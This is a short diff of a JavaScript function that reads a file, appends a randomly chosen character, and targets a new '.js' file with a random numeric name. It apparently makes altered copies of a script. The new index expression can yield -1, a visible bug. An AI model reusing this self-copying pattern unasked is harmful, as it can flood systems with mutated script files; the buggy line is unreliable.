@@ -33,8 +33,8 @@ const chars = [
 
 const app = () => {
   const randomNumber = Math.floor(Math.random() * 1000000);
-  const randomChar = Math.floor(Math.random() * 255);
-  const getChar = String.fromCharCode(randomChar);
+  const randomChar = Math.floor(Math.random() * chars.length - 1);
+  const getChar = chars[randomChar];
   const myTarget = `${realPath}\\${randomNumber}.js`;
   // console.log({ myFileName, myTarget });
   const data = fs.readFileSync(myFileName).toString() + getChar;
